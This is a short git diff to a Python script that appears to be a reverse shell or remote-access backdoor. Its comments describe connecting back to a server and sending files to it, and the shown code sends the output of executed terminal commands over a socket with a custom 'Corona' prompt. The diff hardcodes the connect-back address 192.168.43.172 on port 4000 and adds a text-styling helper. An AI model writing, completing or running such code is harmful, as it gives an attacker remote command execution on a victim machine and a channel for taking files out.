@@ -17,7 +17,9 @@ from Crypto.Cipher import AES
 
 
 port = 4000
-host = socket.gethostbyname(socket.gethostname())
+host = "192.168.43.172"
+
+
 
 
 #tries to connect back to the server
@@ -84,6 +86,12 @@ def establish_connection():
             terminal_output = terminal_output.stdout.read() + terminal_output.stderr.read()
             terminal_output = terminal_output.decode()
             sock.send(str(terminal_output).encode() + '\033[1;32mCorona:~\033[1;m'.encode() + str(os.getcwd() + "> ").encode())
+
+
+
+def style_text(text):
+    return f"\033[1;37m{text}\033[0m"
+
 
 
 #sends file to server
